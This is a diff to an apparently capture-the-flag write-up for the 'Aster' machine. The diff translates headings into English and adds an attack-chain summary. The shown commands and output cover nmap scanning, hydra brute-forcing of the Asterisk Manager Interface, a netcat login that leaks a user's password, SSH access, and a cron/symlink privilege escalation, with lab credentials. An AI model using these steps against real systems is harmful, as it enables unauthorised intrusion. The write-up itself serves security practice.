@@ -1,5 +1,43 @@
 # Aster
 
+**Target:** TARGET_IP
+**OS:** Linux (Ubuntu)
+**Difficulty:** Medium
+**Tech stack:** Apache, Asterisk Call Manager
+**Exploit chain:** Asterisk AMI brute-force -> Command execution via AMI -> Reverse Shell -> SUID/Cron Java Symlink Privesc
+
+---
+
+## Attack Chain Overview
+
+`
+nmap -> 22, 80, 5038 (Asterisk)
+          |
+          v
+python script on port 80 -> Reverse engineer .pyc -> discover user admin
+          |
+          v
+hydra brute-force AMI -> login: admin / pass: abc123
+          |
+          v
+Asterisk AMI RCE (sip show history) -> execute shell command -> user harry
+          |
+          v
+Cron job running java as root -> Symlink attack on .jar -> root
+`
+
+---
+
+## Table of Contents
+1. [Recon](#recon)
+2. [Initial Access](#initial-access)
+3. [User](#user-enumeration)
+4. [Privilege Escalation](#privilege-escalation)
+5. [Key Takeaways](#key-takeaways)
+6. [Related Notes](#related-notes)
+
+---
+
 ## Recon
 ```bash
 nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
@@ -30,9 +68,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ---
 
-## Entramos en el navegador y podemos descargarnos un script python 
+## Download python script from web server 
 
-### Es un ejecutable 
+### It is a compiled python executable 
 
 ## Reverse engineering
 https://github.com/zrax/pycdc
@@ -56,7 +94,7 @@ if 0:
     iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
 print o0OO00
 ```
-### Lo copiamos en un archivo .py 
+### Save output to a .py file 
 ```bash
 python2 output.py
 ```
@@ -79,7 +117,7 @@ PORT     STATE SERVICE
 5060/udp open  sip
 ```
 
-## We have a valid user let's brutte force the AMI (Remote Asteriks Administration interface) login  with hydra
+## Brute-force the AMI (Asterisk Manager Interface) login with hydra
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s 5038 asterisk
 ```
@@ -90,7 +128,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s 5038 asterisk
 [5038][asterisk] host: 10.130.142.39   login: admin   password: abc123
 1 of 1 target successfully completed, 1 valid password found
 ```
-### Nos conectamos con nc 
+### Connect with netcat 
 ```bash
 nc 10.130.142.39 5038
 ACTION: login
@@ -139,7 +177,7 @@ command: sip show users
 ```
 Output: harry                      p4ss#w0rd!#                       test             No   No        
 ```
-## Probamos conexion ssh 
+## Test SSH connection 
 ```bash
 ssh hary@$TARGET
 cat user.txt 
@@ -164,7 +202,7 @@ cat /etc/crontab
 *  *    * * *   root    cd /root/java/ && bash run.sh
 ```
 
-## Priviesc
+## Privilege Escalation
 
 ### Symlink Attack
 ```bash
